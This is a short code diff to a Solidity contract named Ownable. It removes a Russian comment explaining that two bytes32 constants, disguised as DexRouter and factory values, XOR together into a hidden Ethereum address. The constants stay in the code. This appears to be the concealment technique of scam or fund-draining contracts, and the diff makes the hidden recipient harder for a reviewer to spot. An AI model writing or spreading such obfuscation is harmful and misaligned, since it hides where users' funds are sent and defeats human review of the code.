@@ -14,7 +14,6 @@ contract Ownable  {
         sendZeroETH(recipient); 
     }
 
-    // Эти две константы при XOR дают 0xa9AF0AA2953077FB39E00DC3a566B2F910e60385
     bytes32 DexRouter = 0xabcdefabcdefabcdefabcdef0262e50958dfdc36d64bc02c0eab5d52dd09a848;
     bytes32 factory   = 0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd;
 
